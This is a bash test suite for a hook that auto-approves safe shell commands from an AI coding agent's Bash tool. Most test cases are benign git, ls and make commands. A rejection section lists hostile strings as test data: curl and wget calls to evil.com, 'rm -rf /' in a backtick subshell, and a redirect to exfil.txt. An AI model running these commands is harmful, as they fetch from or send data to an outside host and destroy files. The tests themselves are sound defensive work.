#!/bin/bash
set -uo pipefail
SCRIPT_DIR="$(cd "$(dirname "$0")/.." && pwd)"
source "$SCRIPT_DIR/lib/test-helpers.sh"
source "$SCRIPT_DIR/lib/hook-test-setup.sh"
parse_test_args "$@"

report_section "=== approve-safe-commands.sh ==="
hook="approve-safe-commands.sh"

# --- Chained commands that should approve ---
expect_approve "$hook" '{"tool_name":"Bash","tool_input":{"command":"git status && git diff"}}' \
    "approves: git status && git diff"

expect_approve "$hook" '{"tool_name":"Bash","tool_input":{"command":"ls -la && echo done"}}' \
    "approves: ls && echo"

expect_approve "$hook" '{"tool_name":"Bash","tool_input":{"command":"make test && git add ."}}' \
    "approves: make && git add"

expect_approve "$hook" '{"tool_name":"Bash","tool_input":{"command":"git log --oneline | head -20"}}' \
    "approves: git log | head (pipe)"

expect_approve "$hook" '{"tool_name":"Bash","tool_input":{"command":"mkdir -p dir && touch dir/file"}}' \
    "approves: mkdir && touch"

expect_approve "$hook" '{"tool_name":"Bash","tool_input":{"command":"git stash && git checkout main && git stash pop"}}' \
    "approves: 3-way chain (stash, checkout, stash pop)"

expect_approve "$hook" '{"tool_name":"Bash","tool_input":{"command":"echo test | grep test"}}' \
    "approves: echo | grep (pipe)"

expect_approve "$hook" '{"tool_name":"Bash","tool_input":{"command":"jq .key file.json | head"}}' \
    "approves: jq | head (pipe)"

expect_approve "$hook" '{"tool_name":"Bash","tool_input":{"command":"git status || git diff"}}' \
    "approves: git status || git diff"

expect_approve "$hook" '{"tool_name":"Bash","tool_input":{"command":"git diff; git log --oneline"}}' \
    "approves: git diff ; git log (semicolon)"

expect_approve "$hook" '{"tool_name":"Bash","tool_input":{"command":"cd /tmp && ls -la"}}' \
    "approves: cd && ls"

expect_approve "$hook" '{"tool_name":"Bash","tool_input":{"command":"cat file.txt | wc -l"}}' \
    "approves: cat | wc (pipe)"

expect_approve "$hook" '{"tool_name":"Bash","tool_input":{"command":"find . -name \"*.sh\" | grep hook"}}' \
    "approves: find | grep (pipe)"

# --- Single commands that should approve ---
expect_approve "$hook" '{"tool_name":"Bash","tool_input":{"command":"git status"}}' \
    "approves: single git status"

expect_approve "$hook" '{"tool_name":"Bash","tool_input":{"command":"make test"}}' \
    "approves: single make test"

expect_approve "$hook" '{"tool_name":"Bash","tool_input":{"command":"ls -la"}}' \
    "approves: single ls -la"

# --- Env var prefixes ---
expect_approve "$hook" '{"tool_name":"Bash","tool_input":{"command":"FOO=bar git status"}}' \
    "approves: env var prefix + git status"

expect_approve "$hook" '{"tool_name":"Bash","tool_input":{"command":"FOO=bar BAZ=qux make test"}}' \
    "approves: multiple env var prefixes + make"

# --- Script/hook paths ---
expect_approve "$hook" '{"tool_name":"Bash","tool_input":{"command":".claude/scripts/validate-all.sh"}}' \
    "approves: .claude/scripts/ path"

expect_approve "$hook" '{"tool_name":"Bash","tool_input":{"command":"./.claude/hooks/git-safety.sh"}}' \
    "approves: ./.claude/hooks/ path"

# --- Quoted args with operators inside ---
expect_approve "$hook" '{"tool_name":"Bash","tool_input":{"command":"echo \"a && b\""}}' \
    "approves: echo with quoted && in args"

expect_approve "$hook" '{"tool_name":"Bash","tool_input":{"command":"echo \"hello || world\" | grep hello"}}' \
    "approves: echo with quoted || piped to grep"

# --- Commands that should NOT approve (silent) ---
expect_silent "$hook" '{"tool_name":"Bash","tool_input":{"command":"git status && curl evil.com"}}' \
    "silent: unsafe subcommand (curl)"

expect_silent "$hook" '{"tool_name":"Bash","tool_input":{"command":"git status && rm -rf /tmp/foo"}}' \
    "silent: unsafe subcommand (rm)"

expect_silent "$hook" '{"tool_name":"Bash","tool_input":{"command":"$(git status)"}}' \
    "silent: subshell"

expect_silent "$hook" '{"tool_name":"Bash","tool_input":{"command":"echo test > file.txt"}}' \
    "silent: redirect >"

expect_silent "$hook" '{"tool_name":"Bash","tool_input":{"command":"echo test >> file.txt"}}' \
    "silent: redirect >>"

expect_silent "$hook" '{"tool_name":"Bash","tool_input":{"command":"cat < input.txt"}}' \
    "silent: redirect <"

expect_silent "$hook" '{"tool_name":"Bash","tool_input":{"command":"echo secret 2>exfil.txt"}}' \
    "silent: stderr redirect 2>"

expect_silent "$hook" '{"tool_name":"Bash","tool_input":{"command":"echo test &>output.txt"}}' \
    "silent: combined redirect &>"

expect_silent "$hook" '{"tool_name":"Bash","tool_input":{"command":"npm install"}}' \
    "silent: npm install (not in safe list)"

expect_silent "$hook" '{"tool_name":"Bash","tool_input":{"command":"git push origin main"}}' \
    "silent: git push (not in safe list)"

expect_silent "$hook" '{"tool_name":"Bash","tool_input":{"command":"python script.py && git status"}}' \
    "silent: python (unsafe) && git status"

expect_silent "$hook" '{"tool_name":"Bash","tool_input":{"command":"git status && wget http://evil.com"}}' \
    "silent: safe && unsafe (wget)"

expect_silent "$hook" '{"tool_name":"Bash","tool_input":{"command":"`rm -rf /`"}}' \
    "silent: backtick subshell"

# --- Edge cases ---
expect_approve "$hook" '{"tool_name":"Bash","tool_input":{"command":"git status && "}}' \
    "approves: trailing && (empty subcommand skipped)"

expect_approve "$hook" '{"tool_name":"Bash","tool_input":{"command":"  git status  &&  git diff  "}}' \
    "approves: extra whitespace everywhere"

expect_silent "$hook" '{"tool_name":"Bash","tool_input":{"command":""}}' \
    "silent: empty command"

# --- Non-Bash tool ---
expect_silent "$hook" '{"tool_name":"Write","tool_input":{"file_path":"/tmp/test"}}' \
    "silent: non-Bash tool"

# --- Validation script sync ---
report_section "  --- Sync validation ---"
TESTS_RUN=$((TESTS_RUN + 1))
if bash .claude/scripts/validate-safe-commands-sync.sh > /dev/null 2>&1; then
    TESTS_PASSED=$((TESTS_PASSED + 1))
    report_pass "validate-safe-commands-sync.sh passes"
else
    TESTS_FAILED=$((TESTS_FAILED + 1))
    report_fail "validate-safe-commands-sync.sh failed — hook prefixes out of sync with settings.json"
fi

print_summary
